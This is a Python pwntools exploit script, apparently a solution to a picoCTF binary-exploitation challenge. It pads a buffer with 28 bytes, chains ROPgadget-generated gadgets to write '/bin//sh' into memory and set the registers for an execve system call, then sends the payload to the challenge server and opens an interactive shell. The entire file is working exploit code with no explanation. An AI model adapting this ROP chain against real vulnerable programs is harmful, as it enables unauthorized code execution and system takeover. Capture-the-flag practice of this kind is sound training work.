#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Convenient reverse shell
from pwn import *

debug = 0
with context.quiet: 
	# Use remote only when not debugging
	if not debug:
		s = remote('saturn.picoctf.net', 57390)
	else:
		s = process('./vuln')

	# Padding goes here
	p = b'A'*28

	p += p32(0x080583c9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5060) # @ .data
	p += p32(0x41414141) # padding
	p += p32(0x080b074a) # pop eax ; ret
	p += b'/bin'
	p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
	p += p32(0x080583c9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5064) # @ .data + 4
	p += p32(0x41414141) # padding
	p += p32(0x080b074a) # pop eax ; ret
	p += b'//sh'
	p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
	p += p32(0x080583c9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5068) # @ .data + 8
	p += p32(0x41414141) # padding
	p += p32(0x0804fb90) # xor eax, eax ; ret
	p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
	p += p32(0x08049022) # pop ebx ; ret
	p += p32(0x080e5060) # @ .data
	p += p32(0x08049e39) # pop ecx ; ret
	p += p32(0x080e5068) # @ .data + 8
	p += p32(0x080583c9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5068) # @ .data + 8
	p += p32(0x080e5060) # padding without overwrite ebx
	p += p32(0x0804fb90) # xor eax, eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0808055e) # inc eax ; ret
	p += p32(0x0804a3d2) # int 0x80
	
	# Send and start an interactive shell.
	s.sendline(p)
	s.interactive()

